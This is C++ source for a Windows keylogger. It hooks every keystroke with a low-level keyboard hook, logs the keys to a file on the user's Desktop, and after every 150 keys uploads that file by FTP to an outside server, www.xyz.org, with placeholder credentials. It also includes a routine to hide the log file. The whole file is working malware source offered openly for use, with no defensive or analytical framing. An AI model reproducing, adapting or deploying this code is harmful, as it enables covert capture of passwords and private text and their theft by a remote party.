#define _CRT_SECURE_NO_WARNINGS
#pragma comment (lib,"wininet.lib")
#include <windows.h>
#include <wininet.h> //for uploadFile function
#include <shlobj.h>
#include <iostream>
using namespace std;

char * extractFilename(char * path) {
	char * ret = path;
	bool isFullPath = false;
	for (int i = 0; i<strlen(path); i++) {
		if (ret[i] == '\\') {
			isFullPath = true;
		}
	}
	if (isFullPath) {
		ret = (char *)((DWORD)path + lstrlen(path) - 1);
		while (*ret != '\\')
			ret--;
		ret++;
	}
	return ret;
}

FILE * f;
HHOOK hKeyboardHook;

/*Change file attributes to hidden*/
void hide_file(char * file)
{
	if (GetFileAttributes(file) != 0x22)
		SetFileAttributes(file, 0x22);
}

/*Since we are working with files placed on desktop we need the Desktop directory path*/
bool getDesktopPath(char * ret)
{
	char desktop[260];
	if (SUCCEEDED(SHGetFolderPath(NULL,
		CSIDL_DESKTOPDIRECTORY | CSIDL_FLAG_CREATE,
		NULL,
		SHGFP_TYPE_CURRENT,
		desktop)))
	{
		strcpy(ret, desktop);
		return true;
	}
	else
	{
		ret = NULL;
		return false;
	}
}

//Multiple concatenation
char *dupcat(const char *s1, ...) {
	int len;
	char *p, *q, *sn;
	va_list ap;

	len = strlen(s1);
	va_start(ap, s1);
	while (1) {
		sn = va_arg(ap, char *);
		if (!sn)
			break;
		len += strlen(sn);
	}
	va_end(ap);

	p = new char[len + 1];
	strcpy(p, s1);
	q = p + strlen(p);

	va_start(ap, s1);
	while (1) {
		sn = va_arg(ap, char *);
		if (!sn)
			break;
		strcpy(q, sn);
		q += strlen(q);
	}
	va_end(ap);

	return p;
}//Example: cout<<dupcat("D:","\\","Folder",0)<<endl; ==> D:\Folder

 /*Upload file to server*/
BOOL uploadFile(char *filename, char *destination_name, char *address, char *username, char *password)
{
	BOOL t = false;
	HINTERNET hint, hftp;
	hint = InternetOpen("FTP", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, INTERNET_FLAG_ASYNC);
	hftp = InternetConnect(hint, address, INTERNET_DEFAULT_FTP_PORT, username, password, INTERNET_SERVICE_FTP, 0, 0);
	t = FtpPutFile(hftp, filename, destination_name, FTP_TRANSFER_TYPE_BINARY, 0);
	InternetCloseHandle(hftp);
	InternetCloseHandle(hint);
	return t;
}

static int keysPressed = 0; //Lets count the keys pressed

LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	char currentDirectory[260];
	char * workFullPath = NULL;


	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		bool truth = getDesktopPath(currentDirectory); //If we can capture the desktop directory then we are good
		if (truth)
		{
			//Concatenate desktop directory and files
			workFullPath = dupcat(currentDirectory, "\\work.txt", NULL); //So the file path will be like: C:\Users\Corporation\Desktop\work.txt
			//printf("%s\n", workFullPath);
			f = fopen(workFullPath, "a+"); //Open the file
		}
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD dwMsg = 1;
		dwMsg += hooked_key.scanCode << 16;
		dwMsg += hooked_key.flags << 24;
		char lpszKeyName[1024] = { 0 };
		lpszKeyName[0] = '[';

		int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;
		int key = hooked_key.vkCode;
		lpszKeyName[i] = ']';
		//Key value or something else ?
		//if the key if from A-Z,a-z,0-9 then add this to file
		if (key >= 'A' && key <= 'Z')
		{
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				key += 0x20;
			if (f != NULL)
				fprintf(f, "%c", key);
		}
		//else add the name of the key.For example if the key is 32 -> Add "Space" to the file,so we know that space has been pressed.lpszKeyName is that name.
		else
		{
			if (f != NULL)
				fprintf(f, "%s", lpszKeyName);
		}
		keysPressed++;
		if (keysPressed == 150) //Enough data
		{
			//extractFilename is used to extract only the file from path:Example: C:\data\x.php,
			//extractFilename("C:\\data\\x.php") => x.php so that we add only the file to ftp
			uploadFile(workFullPath, extractFilename(workFullPath), "www.xyz.org", "ftpUsername", "ftpPassword"); //Upload the file to FTP
			keysPressed = 0;
		}

		//You can make the file hidden :))
		//hide_file(workFullPath);
		fclose(f);
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI JACKAL(LPVOID lpParm)
{
	HINSTANCE hins;
	hins = GetModuleHandle(NULL);
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger, hins, 0);

	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}

void main() {
	JACKAL(NULL);
}